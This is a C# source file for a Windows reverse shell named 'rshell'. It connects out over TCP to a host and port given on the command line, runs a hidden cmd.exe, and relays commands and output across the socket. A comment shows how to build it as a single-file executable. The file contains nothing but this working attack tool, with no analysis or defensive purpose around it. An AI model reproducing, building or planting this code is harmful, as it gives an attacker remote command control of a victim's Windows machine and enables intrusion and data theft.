using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace rshell
{
    class Program
    { //dotnet publish -r win-x64 /p:PublishSingleFile=true csshell.csproj --no-dependencies --self-contained false -c Release
        
        static StreamWriter streamWriter;
        static void Main(string[] args)
        {
            if (args.Length < 2) return;

            using var TcpClient = new TcpClient(args[0], Int32.Parse(args[1]));
            using var iStream = TcpClient.GetStream();

            using var sReader = new StreamReader(iStream);
            streamWriter = new StreamWriter(iStream);

            var p = new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                }
            };
            p.OutputDataReceived += new DataReceivedEventHandler(incoming);

            p.Start();
            p.BeginOutputReadLine();

            var cmdline = new StringBuilder();
            while (TcpClient.Connected)
            {
                cmdline.Append(sReader.ReadLine());
                if (cmdline.Equals("exit"))
                    TcpClient.Close();
                else
                {
                    p.StandardInput.WriteLine(cmdline);
                    cmdline.Clear();
                }
            }

        }

        static void incoming(object sender, DataReceivedEventArgs data)
        {
            var sdata = new StringBuilder();

            if (!string.IsNullOrEmpty(data?.Data))
            {
                try
                {                    
                    sdata.Append(data.Data);                    
                    streamWriter.WriteLine(sdata);
                    streamWriter.Flush();
                }
                catch { }
            }

        }

    }
}
